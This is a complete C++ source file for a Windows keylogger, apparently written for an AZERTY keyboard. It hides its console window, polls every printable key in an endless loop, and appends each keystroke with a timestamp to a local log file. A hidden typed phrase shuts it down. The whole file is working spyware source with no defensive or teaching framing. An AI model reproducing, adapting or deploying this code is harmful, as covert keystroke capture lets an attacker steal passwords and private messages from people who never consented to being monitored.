#include <iostream>
#include <windows.h>
#include <ctime>
#include <fstream>
using namespace std;
// the following array is the key codes of the printable keys + space_key + enter_key + back_space
short keys[]={8,13,32,48,58,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,186,187,188,190,191,192,193,219,220,221,222,223,226};
bool shift()
{   // Check if shift is pressed
    // If the high-order bit is 1, the key is down; otherwise, it is up.
    if (GetKeyState(VK_LSHIFT)& 0x8000 || GetKeyState(VK_RSHIFT)& 0x8000) return true;
    return false;
}
bool caps()
{  // Check if caps is toggled
    if (GetKeyState(VK_CAPITAL)) return true;
    return false;
}
bool alt_gr() // alt gr key
{   // Check if alt_gr is pressed
    // If the high-order bit is 1, the key is down; otherwise, it is up.
    // alt_gr is the combination of ctrl key and alt key
    if ((GetKeyState(VK_CONTROL)& 0x8000 )&& (GetKeyState(VK_MENU)& 0x8000)) return true;
    return false;
}
string f(short i)
{
    short upper_case=((shift()^caps())&&(!alt_gr()));
    short ag=alt_gr();
    char temp;
    string out;
    switch(i)
    {
        case 8  : return "[BACK_SPACE]";
        case 13 : temp='\n';break;
        case 32 : temp=' ';break;
        case 48 : temp=133-85*upper_case-69*ag;break; //0
        case 49 : temp='&'+11*upper_case;break; //1
        case 50 : temp=130-80*upper_case-4*ag;break; //2
        case 51 : temp='"'+17*upper_case+ag;break; //3
        case 52 : temp='\''+13*upper_case+84*ag;break;//4
        case 53 : temp='('+13*upper_case+51*ag;break; //5
        case 54 : temp='-'+9*upper_case+79*ag;break; //6
        case 55 : temp=138-83*upper_case-42*ag;break; //7
        case 56 : temp='_'-39*upper_case-3*ag;break; //8
        case 57 : temp=135-78*upper_case-41*ag;break; //9
        case 65 : temp='a'-32*upper_case;break;
        case 66 : temp='b'-32*upper_case;break;
        case 67 : temp='c'-32*upper_case;break;
        case 68 : temp='d'-32*upper_case;break;
        case 69 : temp='e'-32*upper_case+ag*27;break;
        case 70 : temp='f'-32*upper_case;break;
        case 71 : temp='g'-32*upper_case;break;
        case 72 : temp='h'-32*upper_case;break;
        case 73 : temp='i'-32*upper_case;break;
        case 74 : temp='j'-32*upper_case;break;
        case 75 : temp='k'-32*upper_case;break;
        case 76 : temp='l'-32*upper_case;break;
        case 77 : temp='m'-32*upper_case;break;
        case 78 : temp='n'-32*upper_case;break;
        case 79 : temp='o'-32*upper_case;break;
        case 80 : temp='p'-32*upper_case;break;
        case 81 : temp='q'-32*upper_case;break;
        case 82 : temp='r'-32*upper_case;break;
        case 83 : temp='s'-32*upper_case;break;
        case 84 : temp='t'-32*upper_case;break;
        case 85 : temp='u'-32*upper_case;break;
        case 86 : temp='v'-32*upper_case;break;
        case 87 : temp='w'-32*upper_case;break;
        case 88 : temp='x'-32*upper_case;break;
        case 89 : temp='y'-32*upper_case;break;
        case 90 : temp='z'-32*upper_case;break;
        case 96 : temp='0';break;
        case 97 : temp='1';break;
        case 98 : temp='2';break;
        case 99 : temp='3';break;
        case 100: temp='4';break;
        case 101: temp='5';break;
        case 102: temp='6';break;
        case 103: temp='7';break;
        case 104: temp='8';break;
        case 105: temp='9';break;
        case 106: temp='*';break;
        case 107: temp='+';break;
        case 109: temp='-';break;
        case 110: temp='.';break;
        case 111: temp='/';break;
        case 186: temp='$'+120*upper_case;break;
        case 187: temp='='-18*upper_case+64*ag;break;
        case 188: temp=','+19*upper_case;break;
        case 190: temp=';'-13*upper_case;break;
        case 191: temp=':'-11*upper_case;break;
        case 192: temp=151-114*upper_case;break; //ù
        case 219: temp=')'+126*upper_case+51*ag;break;
        case 220: temp='*'+188*upper_case;break;
        case 221: temp='^';break;
        case 222: temp=253;break; //²
        case 223: temp='!'+212*upper_case;break;
        case 226: temp='<'+2*upper_case;break;
        default   : temp=0;upper_case=0;
    }
    out=temp;
    return out;
    // some characters are not directly displayed in a text box, like â à ã à
    // in order to type them one must use alt_gr + the upper symbol (~`^...)
    // and then type the letter
    // these special letters are rarely used. And in this program they cannot be
    // directly logged. So in the log file instead of finding ã we will find
    // ~a.
}
string exit_cmd_buff="##################";
ofstream log_file;
short i=0;
void command(string s) // this function will read keystrokes and execute commands
{
    string exit_cmd="exit_keylogger_now";
    if (s[0]==exit_cmd[i])
        {
            exit_cmd_buff[i]=s[0];
            i++;
        }
    else
    {
        i=0;
    }
    if (!exit_cmd_buff.compare(exit_cmd))
    {
        log_file<<'w'<<endl;
        exit(0);
        log_file.close();
    }

}
int main()
{
    FreeConsole();
    log_file.open("out.txt",ios::app);
    time_t t = time(0);   // get time now
    struct tm * now = localtime( & t );
    log_file<<"---------------"<<endl;
    log_file<<now->tm_mday<<"-"<<now->tm_mon+1<<"-"<<now->tm_year+1900<<" ";
    log_file<<now->tm_hour<<":"<<now->tm_min<<":"<<now->tm_sec<<endl;

    while (true)
    {
        for(int i:keys)
            // 160 161 16 ARE SHIFT KEYS
            // the program must enter the following processing only
            // if the shift keys are not pressed otherwise
            // it cant detect uppercase
        if ((GetAsyncKeyState(i)))
        {
            command(f(i));
            log_file<<f(i);
            while(GetAsyncKeyState(i))
                continue;
        }
    }
    log_file.close();
    return 0;
}




